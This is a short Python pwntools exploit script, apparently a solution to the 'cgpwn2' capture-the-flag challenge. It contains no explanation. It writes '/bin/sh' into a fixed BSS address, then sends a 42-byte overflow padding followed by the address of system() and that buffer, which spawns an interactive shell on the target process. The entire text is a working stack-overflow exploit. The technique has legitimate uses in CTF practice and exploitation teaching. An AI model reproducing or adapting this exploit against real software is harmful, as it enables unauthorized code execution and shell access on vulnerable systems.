from pwn import *

elf = ELF("./cgpwn2")
p = process("./cgpwn2")

bss_addr =  0x0804A080

p.recv()
p.sendline("/bin/sh\x00")

cnt = 42

sys_addr = elf.symbols['system']

p.recv()
rop = ''
rop += cnt * 'a'
rop += p32(sys_addr)
rop += 'a'*4
rop += p32(bss_addr)

p.sendline(rop)
p.interactive()